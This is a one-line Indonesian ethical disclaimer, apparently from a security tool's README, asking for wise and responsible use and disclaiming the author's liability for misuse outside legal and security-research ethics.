+> **Peringatan Etis**: Gunakan alat ini secara bijak, etis, dan bertanggung jawab. Penulis tidak bertanggung jawab atas segala bentuk penyalahgunaan alat ini di luar koridor hukum dan etika riset keamanan siber.
